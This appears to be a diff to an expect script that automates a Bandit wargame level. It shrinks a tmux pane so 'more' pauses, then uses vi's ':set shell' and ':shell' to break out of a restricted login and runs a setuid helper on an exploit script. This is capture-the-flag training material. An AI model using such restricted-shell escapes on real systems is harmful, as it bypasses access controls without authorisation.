@@ -19,12 +19,23 @@ expect "*\$ "
 send "chmod +x /tmp/exploit27.sh\r"
 expect "*\$ "
 
-send_user "by resizing the terminal to a tiny size, 'more' will not finish immediately\n"
-send_user "if your terminal is causing grief, this can be done with tmux by creating a pane that is small\n"
-send_user "ssh in with command 'ssh -o \"StrictHostKeyChecking no\" -i bandit26.sshkey bandit26@localhost'\n"
-send_user "type 'v' to get into vi, then ':set shell=/bin/bash'. without this, shell escape just reshows the more page\n"
-send_user "finally :shell to open a shell as user bandit26, and run './bandit27-do /tmp/exploit27.sh'\n"
+send "tmux\r"
+sleep .3
+send "\x02\""
+sleep .3
+send "\x02:"
+sleep .3
+send "resize-pane -D 50\r"
+sleep .5
 
-send "\r"
+send "ssh -o \"StrictHostKeyChecking no\" -i bandit26.sshkey bandit26@localhost\r"
+sleep .3
+send "v"
+sleep .1
+send ":set shell=/bin/bash\r"
+sleep .1
+send ":shell\r"
+sleep .1
+send "./bandit27-do /tmp/exploit27.sh\r"
 
-interact
+expect "wait for 10 second timeout"
